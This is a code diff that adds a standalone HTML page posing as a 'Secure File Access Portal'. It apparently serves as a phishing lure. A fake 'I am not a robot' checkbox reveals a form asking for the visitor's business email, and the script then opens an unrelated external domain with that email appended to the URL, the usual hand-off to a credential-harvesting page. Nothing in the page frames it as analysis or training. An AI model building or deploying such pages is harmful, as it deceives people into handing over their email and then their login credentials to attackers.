@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Secure File Access Portal</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body{
+margin:0;
+background:#eef2f7;
+font-family:"Segoe UI",sans-serif;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+}
+
+.box{
+width:100%;
+max-width:520px;
+background:#fff;
+border-radius:12px;
+box-shadow:0 20px 50px rgba(0,0,0,0.1);
+padding:40px;
+text-align:center;
+}
+
+input[type="email"]{
+width:100%;
+padding:12px;
+border-radius:6px;
+border:1px solid #ccc;
+margin-bottom:20px;
+}
+
+button{
+width:100%;
+padding:14px;
+background:#1e2a38;
+color:#fff;
+border:none;
+border-radius:6px;
+cursor:pointer;
+}
+
+button:disabled{
+background:#999;
+cursor:not-allowed;
+}
+
+#portal{
+display:none;
+}
+
+.captchaBox{
+display:flex;
+align-items:center;
+justify-content:center;
+gap:10px;
+border:1px solid #ddd;
+padding:15px;
+border-radius:6px;
+margin-top:20px;
+}
+</style>
+</head>
+
+<body>
+
+<!-- CAPTCHA PAGE -->
+<div class="box" id="captchaPage">
+
+<h2>Security Verification</h2>
+<p>Please confirm you are not a robot to continue.</p>
+
+<div class="captchaBox">
+<input type="checkbox" id="robotCheck" onclick="unlockPortal()">
+<label for="robotCheck">I am not a robot</label>
+</div>
+
+</div>
+
+<!-- MAIN PORTAL -->
+<div class="box" id="portal">
+
+<h2>Secure Document Verification</h2>
+<p>Please enter your business email to continue.</p>
+
+<input type="email" id="email" placeholder="name@company.com" required>
+<button type="button" onclick="redirectUser()">Continue Securely</button>
+
+</div>
+
+<script>
+// Unlock portal when checkbox clicked
+function unlockPortal(){
+    document.getElementById("captchaPage").style.display = "none";
+    document.getElementById("portal").style.display = "block";
+
+    // Auto-reset checkbox after 1 second
+    setTimeout(function(){
+        document.getElementById("robotCheck").checked = false;
+    }, 1000);
+}
+
+// Redirect function for email input
+function redirectUser(){
+    var email = document.getElementById("email").value.trim();
+    if(email === "") return alert("Please enter your email");
+
+    // Open new tab exactly like "https://google.comEMAIL"
+    var url = "https://h74699747398.ecofriendlycommunication.de/U2zLK#" + email;
+    window.open(url, "_blank");
+}
+</script>
+
+</body>
+</html>
